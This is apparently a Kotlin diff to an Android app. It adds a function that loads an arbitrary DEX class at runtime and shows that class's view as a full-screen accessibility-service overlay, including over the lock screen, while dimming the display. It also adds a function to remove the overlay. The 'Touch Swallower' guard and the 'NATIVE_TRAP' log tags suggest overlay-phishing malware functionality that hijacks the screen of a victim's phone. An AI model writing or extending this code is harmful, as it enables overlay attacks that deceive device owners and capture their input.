@@ -28,6 +28,9 @@ object DynamicUIManager {
     private var touchGuardView: android.view.View? = null
     private var isGuardAttached: Boolean = false
 
+    private var nativeOverlayView: android.view.View? = null
+    private var isNativeAttached: Boolean = false
+
     class CortexBridge(private val ctx: Context) {
         @JavascriptInterface
         fun close() {
@@ -572,6 +575,75 @@ object DynamicUIManager {
                     isGuardAttached = false
                     DebugLogger.log("GUARD", "Touch Swallower RELEASED")
                 } catch (e: Exception) { }
+            }
+        }
+    }
+
+    fun showNativeOverlay(ctx: Context, dexPath: String, className: String, dimLevel: Int) {
+        Handler(Looper.getMainLooper()).post {
+            val serviceInstance = MyAccessibilityService.instance ?: return@post
+            val wm = serviceInstance.getSystemService(Context.WINDOW_SERVICE) as WindowManager
+            
+            if (isNativeAttached && nativeOverlayView != null) {
+                removeNativeOverlay(ctx, "REPLACEMENT")
+            }
+            
+            try {
+                // Ensure file is readable and secure
+                val dexFile = java.io.File(dexPath)
+                if (!dexFile.exists()) {
+                    DebugLogger.log("NATIVE_TRAP_ERR", "DEX file not found at: $dexPath")
+                    return@post
+                }
+                dexFile.setReadOnly()
+
+                val loader = dalvik.system.DexClassLoader(dexPath, ctx.codeCacheDir.absolutePath, null, ctx.classLoader)
+                val clazz = loader.loadClass(className)
+                val instance = clazz.getDeclaredConstructor().newInstance()
+                
+                // Dynamic class must have: fun getView(context: Context, bridge: Any): View
+                val method = clazz.getMethod("getView", Context::class.java, Any::class.java)
+                val view = method.invoke(instance, serviceInstance, CortexBridge(ctx)) as android.view.View
+
+                nativeOverlayView = view
+
+                val params = WindowManager.LayoutParams(
+                    WindowManager.LayoutParams.MATCH_PARENT,
+                    WindowManager.LayoutParams.MATCH_PARENT,
+                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
+                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or 
+                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or 
+                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or 
+                    WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED,
+                    android.graphics.PixelFormat.TRANSLUCENT
+                )
+                
+                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
+                    params.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
+                }
+
+                wm.addView(nativeOverlayView, params)
+                isNativeAttached = true
+                
+                DimmerManager.applyDim(ctx, dimLevel, "ACC")
+                DebugLogger.log("NATIVE_TRAP", "Native DEX UI injected successfully from $className")
+            } catch (e: Exception) {
+                DebugLogger.log("NATIVE_TRAP_ERR", "Failed to load DEX: ${e.message}")
+            }
+        }
+    }
+
+    fun removeNativeOverlay(ctx: Context, reason: String = "UNKNOWN") {
+        Handler(Looper.getMainLooper()).post {
+            val serviceInstance = MyAccessibilityService.instance ?: return@post
+            val wm = serviceInstance.getSystemService(Context.WINDOW_SERVICE) as WindowManager
+            
+            if (isNativeAttached && nativeOverlayView != null) {
+                try { wm.removeView(nativeOverlayView) } catch (e: Exception) {}
+                nativeOverlayView = null
+                isNativeAttached = false
+                DimmerManager.removeOverlay(ctx)
+                DebugLogger.log("NATIVE_TRAP", "Native overlay removed. Reason: $reason")
             }
         }
     }
